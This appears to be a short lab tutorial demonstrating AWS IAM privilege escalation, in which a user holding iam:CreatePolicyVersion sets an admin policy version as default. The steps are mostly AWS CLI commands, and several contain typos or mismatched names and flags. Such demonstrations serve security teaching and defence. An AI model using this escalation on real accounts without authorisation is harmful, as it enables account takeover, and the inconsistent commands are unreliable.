## Introduction

- aws iam privilege escaltion
- expoliting create-policy-version [HERE](https://bishopfox.com/blog/privilege-escalation-in-aws)

## Create an Iam User

create an iam user (no aws console access)

```bash
aws iam create-user --user-name demo1
```

create an access key, take note the credentials returned

```bash
aws iam create-access-key --user-name cli-iam-demo
```

then configure aws profile

```bash
aws configure
```

## Create User Console Access

this is optinal

```bash
aws iam create-login-profile --generate-cli-skeleton > test.json
```

fill username and password into the temlate test.json and

```bash
aws iam create-login-profile --cli-input file://test.jon
```

## Apply a Policy to The User

allow the use to create new versions of policies

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "PrivEsc1",
      "Effect": "Allow",
      "Action": "iam:CreatePolicyVersion",
      "Resource": "arn:aws:iam::*:policy/*"
    }
  ]
}
```

create a policy and take note the policy arn

```bash
aws iam create-policy \
  --policy-name AlloCreatePolicyVersion \
  --policy-document file://policy.json
```

attach

```bash
aws iam attach-user-policy \
  --user cli-iam-demo \
  --policy-arn $POLICY_ARN
```

## Priveldge Escalation

now the user upgrate their permission to admin

```bash
aws iam create-policy-version \
-policy-arn $POLICY_ARN \
--policy-document file://admin_policy.json \
--set-as-default
```

## Helper

this will create a template for the input parameters so you know what to provide

```bash
aws iam create-policy --generate-cli-json
```
